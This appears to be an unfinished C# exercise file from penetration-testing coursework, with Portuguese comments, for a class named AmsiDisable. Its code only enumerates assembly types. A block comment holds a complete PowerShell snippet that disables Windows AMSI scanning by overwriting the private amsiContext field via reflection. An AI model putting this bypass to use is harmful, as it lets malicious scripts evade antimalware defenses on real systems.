using System;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Pen300.CS
{
    /* 
     * $a=[Ref].Assembly.GetTypes();
     * Foreach($b in $a) {
     * if ($b.Name - like "*iUtils") {$c =$b} };
     * $d=$c.GetFields('NonPublic,Static');
     * Foreach($e in $d) { if ($e.Name - like "*Context") {$f =$e} };
     * $g=$f.GetValue($null)
     * ;[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);
     * [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
     */
    public class AmsiDisable
    {
        public static void Main()
        {
            // Obter o tipo "System.Management.Automation.AmsiUtils" que vai ter as informações do AMSI
            //var AmsiUtils = Assembly.GetExecutingAssembly().GetType("System.Management.Automation.AmsiUtils");
            var types = Assembly.GetExecutingAssembly().GetTypes();
        }
        
    }
}
